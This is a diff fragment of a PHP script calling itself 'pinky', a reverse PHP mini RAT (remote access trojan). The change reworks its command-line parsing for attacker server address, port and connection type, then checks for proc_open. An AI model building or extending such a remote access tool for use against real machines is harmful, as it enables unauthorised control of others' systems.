@@ -5,18 +5,27 @@ $version = "0.1";
 $author = "David Tavarez (davidtavarez)";
 $url = "https://github.com/davidtavarez/pinky";
 
-echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
-
 $bin = PHP_BINDIR;
 $path = realpath ( NULL ) . '/';
 
-if (isset ( $argv [1] ) == false) {
+echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
+
+$params = "a:";
+$params.= "p:";
+$params.= "t:";
+
+$options = getopt ( $params );
+
+if (isset ( $options['a']) == false) {
 	exit ( "\nERROR: Server address not provided.\n\n" );
 }
+if (isset ( $options['p']) == false) {
+	exit ( "\nERROR: Port number not provided.\n\n" );
+}
 
-$address = $argv [1];
-$port = isset ( $argv [2] ) ? $argv [2] : 3391;
-$type = isset ( $argv [3] ) ? $argv [3] : 'tcp';
+$address = $options['a'];
+$port = (int) $options['p'];
+$type = isset ( $options['t']) ? $options['t']: 'tcp';
 
 echo "\nChecking if function  \e[1mproc_open\e[0m is available... ";
 
